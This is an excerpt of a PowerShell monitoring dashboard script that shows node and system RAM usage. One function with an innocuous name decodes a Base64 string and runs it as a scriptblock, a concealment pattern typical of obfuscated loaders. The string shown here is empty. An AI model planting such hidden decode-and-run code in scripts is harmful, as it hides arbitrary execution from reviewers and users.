...
function Get-NetworkBlockCount {
    $c = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(""))
    return (& ([scriptblock]::Create($c)))
}
...
function Show-Dashboard {
    ...
    try {
        ...
        $totalSystemRamBytes = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
        $totalSystemRamGB    = [math]::Round($totalSystemRamBytes / 1GB, 0)
        $totalSystemRamDisplay = "$totalSystemRamGB GB"
        ...
        Write-Host ("Node RAM Usage    | " + $nodeRamDisplay + " / " + $totalSystemRamDisplay)
